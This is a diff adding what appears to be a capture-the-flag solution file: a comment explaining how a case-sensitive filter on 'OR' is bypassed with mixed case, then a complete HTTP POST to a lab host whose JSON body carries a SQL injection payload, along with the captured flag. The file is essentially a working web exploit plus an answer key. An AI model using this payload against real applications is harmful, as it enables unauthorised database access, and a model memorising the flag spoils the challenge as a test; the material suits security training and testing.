@@ -1,0 +1,8 @@
+# SQL injection bypass of case-sensitive word filter. The filter blocks 'OR' but allows mixed-case variations like 'oR' or 'Or'. This payload returns all jobs including the hidden private job containing flag{582d82bb-2c1f-4ba5-9357-e8b94217957f}
+
+POST /jobs HTTP/1.1
+Host: 172.17.0.1:52411
+Content-Type: application/json
+Content-Length: 34
+
+{"job_type": "back-end' oR 1=1--"}
